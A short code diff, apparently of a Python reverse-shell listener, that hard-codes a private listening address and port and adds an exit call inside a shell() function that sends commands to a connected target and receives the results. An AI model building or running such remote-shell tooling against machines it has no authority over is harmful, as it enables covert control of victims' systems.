@@ -2,9 +2,10 @@
 import socket
 from termcolor import colored
 import json
+from sys import exit
 
 addr = None
-HOST = ''
+HOST = '192.168.0.94'
 PORT = 54321
 
 
@@ -31,6 +32,7 @@ def shell(_s, _target, _addr):
 			print(colored('[-] You decided to exit', 'red'))
 			_target.close()
 			_s.close()
+			exit(1)
 			break
 		else:
 			result = reliable_recv(_target)
